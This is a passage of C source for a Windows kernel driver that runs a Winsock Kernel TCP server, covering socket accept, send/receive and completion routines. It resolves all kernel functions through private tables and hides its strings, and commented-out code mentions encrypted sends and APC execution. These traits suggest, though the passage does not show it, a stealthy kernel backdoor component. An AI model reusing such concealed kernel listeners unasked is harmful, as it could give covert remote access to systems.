		ChangeEntryListSocket(_pGData, 0, WskInfo->s_Sever, &pSocketInfo->List.Link, &pSocketInfo->List.Link, 0);
		ExFreeFunctionMemoryData(pGData, s, pSocketInfo->BufferInfo);
		pSocketInfo->BufferInfo = 0;

	}
	return 0;
}


NTSTATUS ACCEPT_ROUTINE(PVOID _pGData, SOCKET s) {

	Global_Data* pGData = (Global_Data*)_pGData;
	WSK_SERVER_INFO* WskInfo = &pGData->wsk;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;
	PKSOCKET pSocket = &WskInfo->bWsk.kSocket[s];
	

	



	char Buffer[128];
	fNtos->memset(Buffer, 0, 128);
	LIST_ENTRY* pEntry = &WskInfo->ListSocketAccept;
	LIST_ENTRY* bEntry = pEntry->Flink;
	//Buffer
	BOOL ErrorIndex = 0;
	while (bEntry != pEntry) {
		LIST_SOCKET* pSocketNow = (LIST_SOCKET*)bEntry;
		Buffer[pSocketNow->s - 1] = 1;
		bEntry = bEntry->Flink;
		ErrorIndex++;
		if (bEntry == 0 || ErrorIndex > 128) {
			break;
		}
	}


	ChangeEntryListSocket(pGData, Buffer, WskInfo->s_Sever, 0, 0, 2);

	//pEntry = &WskInfo->ListSocketRecv;
	//bEntry = pEntry->Flink;
	//ErrorIndex = 0;
	//while (bEntry != pEntry) {
	//	LIST_SOCKET* pSocketNow = (LIST_SOCKET*)bEntry;
	//	Buffer[pSocketNow->s - 1] = 1;
	//	bEntry = bEntry->Flink;
	//	ErrorIndex++;
	//	if (bEntry == 0 || ErrorIndex > 128) {
	//		break;
	//	}
	//}
	SOCKET sNew = 0;
	for (int i = 0; i < 128; i++){
		if (Buffer[i] == 0) {
			sNew = i + 1;
			break;
		}
		//if (i != fNtos->s){


		//}

	}
	NTSTATUS Status = 0;





	if (sNew != 0)
	{
		LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, 0, KeGetCurrentIrql());

		PKSOCKET pNewSocket = &WskInfo->bWsk.kSocket[sNew];

		pNewSocket->WskSocket = (PWSK_SOCKET)pSocket->AsyncContext.Irp->IoStatus.Information;

		pNewSocket->WskDispatch = (PVOID)pNewSocket->WskSocket->Dispatch;

		LOG_DEBUG_CODE(AArry->Line_Ptr.Ptr, __LINE__, sNew);

		fNtos->KeInitializeEvent(
			&pNewSocket->AsyncContext.CompletionEvent,
			SynchronizationEvent,
			FALSE
		);


		SOCKET_INFO* pSocketInfo = &WskInfo->_SocketArry[sNew];
		LOG_DEBUG_CODE(AArry->Line_Ptr.Ptr, __LINE__, sNew);





		pSocketInfo->BufferInfo = ExAllocateFunctionMemoryData(pGData, sNew);

		if (pSocketInfo->BufferInfo != 0)
		{
			pSocketInfo->pSendBuffer = pSocketInfo->BufferInfo->pSendBuffer;
			pSocketInfo->pRecvBuffer = pSocketInfo->BufferInfo->pRecvBuffer;
			pSocketInfo->kRecvBuffer = pSocketInfo->BufferInfo->kRecvBuffer;
			pSocketInfo->kSendBuffer = pSocketInfo->BufferInfo->kSendBuffer;


			LOG_DEBUG_CODE(AArry->Line_Ptr.Ptr, __LINE__, sNew);

			pSocketInfo->List.s = sNew;
			pSocketInfo->Status = -1;

			//WskInfo->_SocketArry[pSocketNow->s].Status = -1;



			//KeInitializeSpinLock(&pSocketInfo->MemoryLock);

			//pSocketInfo->MemoryLock = 0;

			ChangeEntryListSocket(_pGData, 0, WskInfo->s_Sever, (&WskInfo->ListSocketRecv), (&WskInfo->_SocketArry[sNew].List.Link), 1);

			//InsertHeadList((&WskInfo->ListSocketRecv), (&WskInfo->_SocketArry[sNew].List.Link));

			InitializeListHead(&WskInfo->_SocketArry[sNew].CallBackEntry);

			InitializeListHead(&pSocketInfo->DpcMemory);

			InitializeListHead(&pSocketInfo->ApcMemory);

			LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, pNewSocket->AsyncContext.Irp, sNew, sNew);

			MEMORY_FLAGS MFlags;
			_SendRecvFromEx uSendRecvFromEx = 0;
			_FUNCTION_ENTRY(SendRecvFromEx, MFlags, _SendRecvFromEx);
			Status = uSendRecvFromEx(pGData, sNew, &pSocketInfo->kRecvBuffer, 0);
			FREE_FUNCTION_ENTRY(SendRecvFromEx, MFlags);

			LOG_DEBUG_CODE(AArry->Line_Ptr.Ptr, __LINE__, sNew);
			//STATUS_PENDING
			if (!NT_SUCCESS(Status)) {

				LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pSocket, pSocket->AsyncContext.Irp->IoStatus.Status);

				//if (pSocket->AsyncContext.Irp != 0) {
				//	fNtos->IoFreeIrp(pSocket->AsyncContext.Irp);
				//	pSocket->AsyncContext.Irp = 0;
				//}

				ExFreeFunctionMemoryData(pGData, sNew, pSocketInfo->BufferInfo);
				pSocketInfo->BufferInfo = 0;
				ChangeEntryListSocket(_pGData, 0, WskInfo->s_Sever, &pSocketInfo->List.Link, &pSocketInfo->List.Link, 0);
			}
		}
	}
	MEMORY_FLAGS MFlags;
	_AcceptFromEx uAcceptFromEx = 0;
	_FUNCTION_ENTRY(AcceptFromEx, MFlags, _AcceptFromEx);
	Status = uAcceptFromEx(pGData, s);
	FREE_FUNCTION_ENTRY(AcceptFromEx, MFlags);
	LOG_DEBUG_CODE(AArry->Line_Ptr.Ptr, __LINE__, pGData);
	return Status;
}




NTSTATUS IO_COMPLETION_ROUTINE_Ex(PDEVICE_OBJECT DeviceObject,PIRP Irp,PVOID Context) {

	PWSK_COMPLETION_ROUTINE pWskCompletionRoutine = (PWSK_COMPLETION_ROUTINE)Context;

	Global_Data* pGData = (Global_Data*)pWskCompletionRoutine->pGData;
	SELF_F_ARRY* fArry = &pGData->SelfFArry;
	NTOSKRNL_FUN* fNtos = &pGData->fNtos;
	DWORD64 Ret = 0;
	SELF_STRING_ARRY* AArry = &pGData->SelfAArry;


	WSK_SERVER_INFO* WskInfo = &pGData->wsk;

   // 移除废掉的内存


	//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pGData, pWskCompletionRoutine->s);
	//LIST_ENTRY* pEntry = &WskInfo->_SocketArry[pWskCompletionRoutine->s].CallBackEntry;
	//LIST_ENTRY* bEntry = pEntry->Flink;
	//while (bEntry != pEntry) {

	//	PCOMPLETION_ROUTINE_INFO pComRouInfo = (PCOMPLETION_ROUTINE_INFO)bEntry;
	//	if (fNtos->KeReadStateEvent(&pComRouInfo->RemoveEvent)){
	//		bEntry = bEntry->Flink;
	//		RemoveEntryList(&pComRouInfo->Link);
	//		fNtos->ExFreePoolWithTag(pComRouInfo, 'Tag');
	//		continue;
	//	}
	//	bEntry = bEntry->Flink;
	//}

	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, pGData, pWskCompletionRoutine->s, pWskCompletionRoutine->Flags);


	//fNtos->KeLowerIrql(APC_LEVEL);

	SOCKET s = pWskCompletionRoutine->s;

	if (pWskCompletionRoutine->Flags == 2){
		// LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pGData, pWskCompletionRoutine->s);
		_FUNCTION_IMP(ACCEPT_ROUTINE, Ret, pGData, pWskCompletionRoutine->s);
	}
	else
	{
		_FUNCTION_IMP(RECV_SEND_ROUTINE, Ret, pGData, pWskCompletionRoutine->s, pWskCompletionRoutine->Flags);
	}
	//fNtos->KfRaiseIrql(DISPATCH_LEVEL);

	//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pGData, pWskCompletionRoutine->s);


	//PCOMPLETION_ROUTINE_INFO pComRouInfo = pWskCompletionRoutine->pComRouInfo;
	//fNtos->KeSetEvent(&pComRouInfo->RemoveEvent, IO_NO_INCREMENT, FALSE);
	return STATUS_MORE_PROCESSING_REQUIRED;
}


//NTSTATUS IO_COMPLETION_ROUTINE_Ex(
//	PDEVICE_OBJECT DeviceObject,
//	PIRP Irp,
//	PVOID Context
//) {
//
//
//	//DWORD64 irql = ReadCR8();
//
//	PWSK_COMPLETION_ROUTINE pWskCompletionRoutine = (PWSK_COMPLETION_ROUTINE)Context;
//
//	Global_Data* pGData = (Global_Data*)pWskCompletionRoutine->pGData;
//
//	WSK_SERVER_INFO* WskInfo = &pGData->wsk;
//
//	PKSOCKET pSocket = &WskInfo->bWsk.kSocket[pWskCompletionRoutine->s];
//
//	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
//
//
//
//
//
//
//	//SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;
//
//	//fNtos->KeSetEvent(&pSocket->AsyncContext.CompletionEvent, IO_NO_INCREMENT, FALSE);
//
//
//
//	//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
//	//	__LINE__, pSocket, pWskCompletionRoutine->s);
//
//	//__writecr8(irql);
//
//	return STATUS_MORE_PROCESSING_REQUIRED;
//}














NTSTATUS AcceptFromEx(PVOID _pGData, SOCKET s) {

	Global_Data* pGData = (Global_Data*)_pGData;

	WSK_SERVER_INFO* WskInfo = &pGData->wsk;

	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;
	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;

	UNREFERENCED_PARAMETER(AArry);

	PKSOCKET pSocket = &WskInfo->bWsk.kSocket[s];

	//SOCKADDR addrsock;

	{


		KSOCKET_ASYNC_CONTEXT* AsyncContext = &pSocket->AsyncContext;

		fNtos->KeResetEvent(&AsyncContext->CompletionEvent);

		//
		// Reuse the IRP.
		//

		PWSK_COMPLETION_ROUTINE pWskCompletionRoutine = &WskInfo->_SocketArry[s].pContext;



		//MmIsNonPagedSystemAddressValid()

		pWskCompletionRoutine->pGData = _pGData;

		pWskCompletionRoutine->s = s;

		pWskCompletionRoutine->Flags = 2;


		//PCOMPLETION_ROUTINE_INFO pComRouInfo = 0;
		//do
		//{
		//	pComRouInfo = (PCOMPLETION_ROUTINE_INFO)fNtos->ExAllocatePoolWithTag(NonPagedPool, sizeof(COMPLETION_ROUTINE_INFO), 'Tag');
		//} while (pComRouInfo == 0);

		//fNtos->KeInitializeEvent(&pComRouInfo->RemoveEvent, SynchronizationEvent, FALSE);
		//pComRouInfo->pCall_back = 0;
		//FLUSH_FUNCTION_ENTRY(IO_COMPLETION_ROUTINE_Ex, pComRouInfo->pCall_back, PIO_COMPLETION_ROUTINE);
		//InsertHeadList(&WskInfo->_SocketArry[s].CallBackEntry, &pComRouInfo->Link);
		////pComRouInfo
		//pWskCompletionRoutine->pComRouInfo = pComRouInfo;
		

		//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pComRouInfo->pCall_back, s);

		fNtos->IoReuseIrp(AsyncContext->Irp, STATUS_UNSUCCESSFUL);

		IoSetCompletionRoutineV(
			AsyncContext->Irp,
			(PIO_COMPLETION_ROUTINE)pGData->IO_COMPLETION_ROUTINE_Ex.SelfTradition, //&IO_COMPLETION_ROUTINE_AcceptEx
			pWskCompletionRoutine,
			TRUE,
			TRUE,
			TRUE
		);
	}



	NTSTATUS Status = pSocket->WskListenDispatch->WskAccept(
		pSocket->WskSocket,          // ListenSocket
		0,                          // Flags
		NULL,                       // AcceptSocketContext
		NULL,                       // AcceptSocketDispatch
		NULL,               // LocalAddress
		NULL,              // RemoteAddress
		pSocket->AsyncContext.Irp//Socket->AsyncContext.Irp    // Irp
	);

	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pSocket, Status);
	//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
	//	__LINE__, pSocket, s);
	return Status;
};



NTSTATUS SendRecvFromEx(PVOID _pGData, SOCKET s, WSK_BUF* pBuffer, DWORD Flags){

	Global_Data* pGData = (Global_Data*)_pGData;

	WSK_SERVER_INFO* WskInfo = &pGData->wsk;

	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;

	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;

	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;

	PKSOCKET pSocket = &WskInfo->bWsk.kSocket[s];
	{
		KSOCKET_ASYNC_CONTEXT* AsyncContext = &pSocket->AsyncContext;

		LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, AsyncContext->Irp, s, s);

		fNtos->KeResetEvent(&AsyncContext->CompletionEvent);

		fNtos->IoReuseIrp(AsyncContext->Irp, STATUS_UNSUCCESSFUL);


		LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, AsyncContext->Irp, s, s);

		PWSK_COMPLETION_ROUTINE pWskCompletionRoutine = &WskInfo->_SocketArry[s].pContext;

		pWskCompletionRoutine->pGData = _pGData;

		pWskCompletionRoutine->s = s;

		pWskCompletionRoutine->Flags = Flags;

		WskInfo->_SocketArry[s].List.Type = Flags;

		IoSetCompletionRoutineV(
			AsyncContext->Irp,
			(PIO_COMPLETION_ROUTINE)pGData->IO_COMPLETION_ROUTINE_Ex.SelfTradition, //&IO_COMPLETION_ROUTINE_AcceptEx
			pWskCompletionRoutine,
			TRUE,
			TRUE,
			TRUE
		);
	}
	NTSTATUS  Status = 0;
	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, pSocket, s, s);
	if (Flags)
	{
		Status = pSocket->WskConnectionDispatch->WskSend(
			pSocket->WskSocket,        // Socket
			pBuffer,               // Buffer
			WSK_FLAG_NODELAY,                    // Flags
			pSocket->AsyncContext.Irp  // Irp
		);
	}
	else
	{
		Status = pSocket->WskConnectionDispatch->WskReceive(
			pSocket->WskSocket,        // Socket
			pBuffer,               // Buffer
			0,                    // Flags
			pSocket->AsyncContext.Irp  // Irp
		);
	}
	LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD_DWORD.Ptr, __LINE__, pSocket, s, Status);
	return Status;
}



#define MmGetSystemAddressForMdlSafeV(Mdl,Priority,Buffer)     if (Mdl->MdlFlags & (MDL_MAPPED_TO_SYSTEM_VA | MDL_SOURCE_IS_NONPAGED_POOL)) {\
                                                        Buffer = Mdl->MappedSystemVa;}\
                                                        else {Buffer = fNtos->MmMapLockedPagesSpecifyCache(Mdl, KernelMode, MmCached,NULL, FALSE, Priority);}

//#define RECV_SIZE 0x8000
//#define SEND_SIZE 0x100000

DWORD64 FlushWskAccept_SendRecvEx(PVOID _pGData) {

	Global_Data* pGData = (Global_Data*)_pGData;
	WSK_SERVER_INFO* WskInfo = &pGData->wsk;
	NTOSKRNL_FUN* fNtos = &((Global_Data*)pGData)->fNtos;
	SELF_F_ARRY* fArry = &((Global_Data*)pGData)->SelfFArry;

	SELF_STRING_ARRY* AArry = &((Global_Data*)pGData)->SelfAArry;

	//UNREFERENCED_PARAMETER(AArry);

	//_AcceptFromEx uAcceptFromEx = 0;
	//_FUNCTION_ENTRY(AcceptFromEx, uAcceptFromEx, _AcceptFromEx);
	//if (uAcceptFromEx != 0)
	//{
	//	LIST_ENTRY* pEntry = &WskInfo->ListSocketAccept;
	//	LIST_ENTRY* bEntry = pEntry->Flink;
	//	while (bEntry != pEntry) {


	//		LIST_SOCKET* pSocketNow = (LIST_SOCKET*)bEntry;

	//		if (!NT_SUCCESS(WskInfo->_SocketArry[pSocketNow->s].Status)) {
	//			
	//			LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pSocketNow, pSocketNow->s);

	//			WskInfo->_SocketArry[pSocketNow->s].Status = uAcceptFromEx(pGData, pSocketNow->s);

	//		}
	//		else
	//		{
	//			PKSOCKET pSocket = &WskInfo->bWsk.kSocket[pSocketNow->s];

	//			LONG state = fNtos->KeReadStateEvent(&pSocket->AsyncContext.CompletionEvent);

	//			if (state) {

	//				SOCKET sNew = (WskInfo->bWsk.KsIndex++ % 128) + 1;

	//				LOG_DEBUG_CODE(AArry->Line_Ptr.Ptr, __LINE__, sNew);

	//				PKSOCKET pNewSocket = &WskInfo->bWsk.kSocket[sNew];
	//				pNewSocket->WskSocket = (PWSK_SOCKET)pSocket->AsyncContext.Irp->IoStatus.Information;
	//				pNewSocket->WskDispatch = (PVOID)pNewSocket->WskSocket->Dispatch;


	//				LOG_DEBUG_CODE(AArry->Line_Ptr.Ptr, __LINE__, sNew);


	//				if (pNewSocket->AsyncContext.Irp == 0){

	//					do
	//					{
	//						pNewSocket->AsyncContext.Irp = fNtos->IoAllocateIrp(1, FALSE);
	//					} while (pNewSocket->AsyncContext.Irp == 0);


	//				}
	//				
	//				fNtos->KeInitializeEvent(&pNewSocket->AsyncContext.CompletionEvent,
	//					SynchronizationEvent,FALSE);

	//				SOCKET_INFO* pSocketInfo = &WskInfo->_SocketArry[sNew];

	//				LOG_DEBUG_CODE(AArry->Line_Ptr.Ptr, __LINE__, sNew);
	//				do
	//				{
	//					pSocketInfo->pSendBuffer = fNtos->MmAllocateNonCachedMemory(SEND_SIZE);
	//				} while (pSocketInfo->pSendBuffer == 0);

	//				do
	//				{
	//					pSocketInfo->pRecvBuffer = fNtos->MmAllocateNonCachedMemory(RECV_SIZE);
	//				} while (pSocketInfo->pRecvBuffer == 0);


	//				pSocketInfo->kSendBuffer.Length = SEND_SIZE;

	//				do
	//				{
	//					pSocketInfo->kSendBuffer.Mdl = fNtos->IoAllocateMdl(pSocketInfo->pSendBuffer, SEND_SIZE, FALSE, FALSE, 0);
	//				} while (pSocketInfo->kSendBuffer.Mdl == 0);

	//				pSocketInfo->kSendBuffer.Offset = 0;
	//				fNtos->MmProbeAndLockPages(pSocketInfo->kSendBuffer.Mdl, KernelMode, IoWriteAccess);


	//				pSocketInfo->kRecvBuffer.Length = RECV_SIZE;

	//				do
	//				{
	//					pSocketInfo->kRecvBuffer.Mdl = fNtos->IoAllocateMdl(pSocketInfo->pRecvBuffer, RECV_SIZE, FALSE, FALSE, 0);
	//				} while (pSocketInfo->kRecvBuffer.Mdl == 0);

	//				pSocketInfo->kRecvBuffer.Offset = 0;

	//				fNtos->MmProbeAndLockPages(pSocketInfo->kRecvBuffer.Mdl, KernelMode, IoWriteAccess);

	//				LOG_DEBUG_CODE(AArry->Line_Ptr.Ptr, __LINE__, sNew);

	//				pSocketInfo->List.s = sNew;
	//				pSocketInfo->Status = -1;
	//				WskInfo->_SocketArry[pSocketNow->s].Status = -1;

	//				InsertHeadList((&WskInfo->ListSocketRecv), (&WskInfo->_SocketArry[sNew].List.Link));

	//				LOG_DEBUG_CODE(AArry->Line_Ptr.Ptr, sNew, pSocketNow->s);
	//			}
	//		}

	//		bEntry = bEntry->Flink;
	//	}
	//	FREE_FUNCTION_ENTRY(uAcceptFromEx, pMdl);
	//}


	//_SendRecvFromEx uSendRecvFromEx = 0;
	//PMDL pMdlSendRecv = 0;
	//_FUNCTION_ENTRY_MDL(SendRecvFromEx, uSendRecvFromEx, _SendRecvFromEx, &pMdlSendRecv);

	//if (uSendRecvFromEx != 0)
	//{
	//	LIST_ENTRY* pEntry = &WskInfo->ListSocketRecv;
	//	LIST_ENTRY* bEntry = pEntry->Flink;

	//	while (bEntry != pEntry) {

	//		LIST_SOCKET* pSocketNow = (LIST_SOCKET*)bEntry;


	//		if (!NT_SUCCESS(WskInfo->_SocketArry[pSocketNow->s].Status)) {


	//			PKSOCKET pNewSocket = &pGData->wsk.bWsk.kSocket[pSocketNow->s];

	//			LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pNewSocket, pSocketNow->s);
	//			PWSK_COMPLETION_ROUTINE pWskCompletionRoutine = (PWSK_COMPLETION_ROUTINE)&WskInfo->_SocketArry[pSocketNow->s].pContext;
	//			
	//			pWskCompletionRoutine->pGData = _pGData;
	//			
	//			pWskCompletionRoutine->s = pSocketNow->s;
	//			

	//			PCOMPLETION_ROUTINE_INFO pComRouInfo = 0;
	//			do
	//			{
	//				pComRouInfo = (PCOMPLETION_ROUTINE_INFO)fNtos->ExAllocatePoolWithTag(NonPagedPool, sizeof(COMPLETION_ROUTINE_INFO), 'Tag');
	//			} while (pComRouInfo == 0);

	//			fNtos->KeInitializeEvent(&pComRouInfo->RemoveEvent, SynchronizationEvent, FALSE);
	//			pComRouInfo->pCall_back = 0;
	//			FLUSH_FUNCTION_ENTRY(IO_COMPLETION_ROUTINE_Ex, pComRouInfo->pCall_back, PIO_COMPLETION_ROUTINE);
	//			InsertHeadList(&WskInfo->_SocketArry[pWskCompletionRoutine->s].CallBackEntry, &pComRouInfo->Link);
	//			//pComRouInfo
	//			pWskCompletionRoutine->pComRouInfo = pComRouInfo;


	//			IoSetCompletionRoutineV(
	//				pNewSocket->AsyncContext.Irp,
	//				pComRouInfo->pCall_back,
	//				pWskCompletionRoutine,
	//				TRUE,
	//				TRUE,
	//				TRUE
	//			);

	//			fNtos->KeInitializeEvent(
	//				&pNewSocket->AsyncContext.CompletionEvent,
	//				SynchronizationEvent,
	//				FALSE
	//			);


	//			WSK_BUF* pWskBuf = &WskInfo->_SocketArry[pSocketNow->s].kRecvBuffer;
	//			pWskBuf->Length = RECV_SIZE;
	//			//if (pSocketNow->Type) {
	//			//	pWskBuf = &WskInfo->_SocketArry[pSocketNow->s].kSendBuffer;
	//			//}

	//			WskInfo->_SocketArry[pSocketNow->s].Status =
	//				uSendRecvFromEx(pGData, pSocketNow->s, pWskBuf, 0);
	//			LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pNewSocket, pSocketNow->s);


	//		}
	//		else
	//		{
	//			PKSOCKET pSocket = &WskInfo->bWsk.kSocket[pSocketNow->s];
	//			LONG state = fNtos->KeReadStateEvent(&(pSocket->AsyncContext.CompletionEvent));
	//			if (state) {

	//				
	//				SOCKET_INFO* pS_Info = &WskInfo->_SocketArry[pSocketNow->s];

	//				if (!NT_SUCCESS(pSocket->AsyncContext.Irp->IoStatus.Status) && pS_Info->List.Type != 2) {

	//					LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr,__LINE__, pSocket, pSocket->AsyncContext.Irp->IoStatus.Status);

	//					pS_Info->List.Type = 2;


	//					//FLUSH_FUNCTION_ENTRY(IO_COMPLETION_ROUTINE_Ex, WskInfo->_SocketArry[pSocketNow->s].IO_CALL_BACK_Accept, PIO_COMPLETION_ROUTINE);

	//					PWSK_COMPLETION_ROUTINE pWskCompletionRoutine = (PWSK_COMPLETION_ROUTINE)&WskInfo->_SocketArry[pSocketNow->s].pContext;

	//					pWskCompletionRoutine->pGData = _pGData;

	//					pWskCompletionRoutine->s = pSocketNow->s;



	//					PCOMPLETION_ROUTINE_INFO pComRouInfo = 0;
	//					do
	//					{
	//						pComRouInfo = (PCOMPLETION_ROUTINE_INFO)fNtos->ExAllocatePoolWithTag(NonPagedPool, sizeof(COMPLETION_ROUTINE_INFO), 'Tag');
	//					} while (pComRouInfo == 0);

	//					fNtos->KeInitializeEvent(&pComRouInfo->RemoveEvent, SynchronizationEvent, FALSE);
	//					pComRouInfo->pCall_back = 0;
	//					FLUSH_FUNCTION_ENTRY(IO_COMPLETION_ROUTINE_Ex, pComRouInfo->pCall_back, PIO_COMPLETION_ROUTINE);
	//					InsertHeadList(&WskInfo->_SocketArry[pWskCompletionRoutine->s].CallBackEntry, &pComRouInfo->Link);
	//					//pComRouInfo
	//					pWskCompletionRoutine->pComRouInfo = pComRouInfo;



	//					IoSetCompletionRoutineV(
	//						pSocket->AsyncContext.Irp,
	//						pComRouInfo->pCall_back,
	//						pWskCompletionRoutine,
	//						TRUE,
	//						TRUE,
	//						TRUE
	//					);

	//					fNtos->KeInitializeEvent(
	//						&pSocket->AsyncContext.CompletionEvent,
	//						SynchronizationEvent,
	//						FALSE
	//					);

	//					pS_Info->Status = pSocket->WskConnectionDispatch->WskCloseSocket(
	//						pSocket->WskSocket,
	//						pSocket->AsyncContext.Irp
	//					);

	//					//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
	//					//	__LINE__, pSocket, pSocket->AsyncContext.Irp->IoStatus.Status);

	//				}
	//				else if (pSocketNow->Type == 1) // 已经发送成功
	//				{
	//					WSK_BUF* pWskBuf = &pS_Info->kRecvBuffer;
	//					
	//					pS_Info->Status =
	//						uSendRecvFromEx(pGData, pSocketNow->s, pWskBuf, 0);

	//					if (NT_SUCCESS(pS_Info->Status)) {
	//						pSocketNow->Type = 0;
	//					}

	//					//fNtos->DbgPrintEx(DPFLTR_DEFAULT_ID, DPFLTR_ERROR_LEVEL, AArry->Line_Ptr_DWORD.Ptr,
	//					//	__LINE__, pSocket, pS_Info->Status);


	//				}
	//				else if (pSocketNow->Type == 0)
	//				{
	//					//WSK_BUF* pWskBuf = &WskInfo->_SocketArry[pSocketNow->s].kRecvBuffer;
	//					//PVOID pBuffer = 0;
	//					//MmGetSystemAddressForMdlSafeV(pWskBuf->Mdl, NormalPagePriority, pBuffer);

	//					if (pS_Info->pRecvBuffer !=  0){

	//						ULONG  Length = (ULONG)pSocket->AsyncContext.Irp->IoStatus.Information;

	//						LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr,__LINE__, pSocket, Length);

	//						DWORD64 uRet = 0;
	//						_FUNCTION_IMP(hBufferSocket, uRet, pGData, pSocketNow->s, pS_Info->pRecvBuffer, Length);
	//						//if (WskInfo->hBuffer != 0)
	//						//	WskInfo->hBuffer(pGData, pSocketNow->s, pS_Info->pRecvBuffer, Length);

	//						if (uRet == -1){

	//							fNtos->KeResetEvent(&pSocket->AsyncContext.CompletionEvent);
	//							//pS_Info->List.Type = 2;


	//							//FLUSH_FUNCTION_ENTRY(IO_COMPLETION_ROUTINE_Ex, WskInfo->_SocketArry[pSocketNow->s].IO_CALL_BACK, PIO_COMPLETION_ROUTINE);

	//							//PWSK_COMPLETION_ROUTINE pWskCompletionRoutine = (PWSK_COMPLETION_ROUTINE)&WskInfo->_SocketArry[pSocketNow->s].pContext;

	//							//pWskCompletionRoutine->pGData = _pGData;

	//							//pWskCompletionRoutine->s = pSocketNow->s;

	//							//IoSetCompletionRoutineV(
	//							//	pSocket->AsyncContext.Irp,
	//							//	WskInfo->_SocketArry[pSocketNow->s].IO_CALL_BACK,
	//							//	pWskCompletionRoutine,
	//							//	TRUE,
	//							//	TRUE,
	//							//	TRUE
	//							//);

	//							//fNtos->KeInitializeEvent(
	//							//	&pSocket->AsyncContext.CompletionEvent,
	//							//	SynchronizationEvent,
	//							//	FALSE
	//							//);

	//							//pS_Info->Status = pSocket->WskConnectionDispatch->WskCloseSocket(
	//							//	pSocket->WskSocket,
	//							//	pSocket->AsyncContext.Irp
	//							//);
	//							//break;
	//						}

	//					}
	//					else
	//					{
	//						fNtos->KeResetEvent(&pSocket->AsyncContext.CompletionEvent);
	//					}
	//					//fNtos->KeResetEvent(&pSocket->AsyncContext.CompletionEvent);

	//				}
	//				else if (pSocketNow->Type == 2) {


	//				LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr, __LINE__, pSocket, pSocket->AsyncContext.Irp->IoStatus.Status);

	//					if (pSocket->AsyncContext.Irp != 0) {
	//						fNtos->IoFreeIrp(pSocket->AsyncContext.Irp);
	//						pSocket->AsyncContext.Irp = 0;
	//					}

	//					fNtos->MmUnlockPages(pS_Info->kSendBuffer.Mdl);
	//					fNtos->MmUnlockPages(pS_Info->kRecvBuffer.Mdl);

	//					fNtos->IoFreeMdl(pS_Info->kRecvBuffer.Mdl); pS_Info->kRecvBuffer.Mdl = 0;
	//					fNtos->IoFreeMdl(pS_Info->kSendBuffer.Mdl); pS_Info->kSendBuffer.Mdl = 0;

	//					fNtos->MmFreeNonCachedMemory(pS_Info->pSendBuffer, SEND_SIZE); pS_Info->pSendBuffer = 0;
	//					fNtos->MmFreeNonCachedMemory(pS_Info->pRecvBuffer, RECV_SIZE); pS_Info->pRecvBuffer = 0;

	//					RemoveEntryList(&pS_Info->List.Link);
	//					//FREE_FUNCTION_ENTRY(IO_COMPLETION_ROUTINE_Ex, pS_Info-);
	//					break;
	//				}
	//				else if (pSocketNow->Type == 4) {


	//				//LOG_DEBUG_CODE(AArry->Line_Ptr_DWORD.Ptr,__LINE__, pSocket, pSocket->AsyncContext.Irp->IoStatus.Status);

	//				//    FREE_FUNCTION_ENTRY(RunApc, pS_Info->_RunApcArg._Run_Routine);

	//				//	//FREE_FUNCTION_ENTRY(RunApcNo, pS_Info->_RunApcArg._Normal_Routine);

	//				//	IOINFO* pIO_INFO = pS_Info->_RunApcArg.rBuffer;

	//				//	_sendEncrypt uSendEncrypt = 0;
	//				//	_FUNCTION_ENTRY(sendEncrypt, uSendEncrypt, _sendEncrypt);
	//				//	
	//				//	uSendEncrypt(pGData, pSocketNow->s, 0x21212121,
	//				//		pS_Info->_RunApcArg.rBuffer, pS_Info->_RunApcArg.rLen);
	//				//	FREE_FUNCTION_ENTRY(sendEncrypt, uSendEncrypt);
 //                   }
	//			}
	//		}
	//		bEntry = bEntry->Flink;
	//	}

	//	FREE_FUNCTION_ENTRY(uSendRecvFromEx, pMdlSendRecv);

	//}
	return 0;
}



DWORD  QueryDosDeviceW(PVOID _pGData, LPCWSTR lpDeviceName, LPWSTR lpTargetPath, DWORD ucchMax) {


	Global_Data* pGData = (Global_Data*)_pGData;
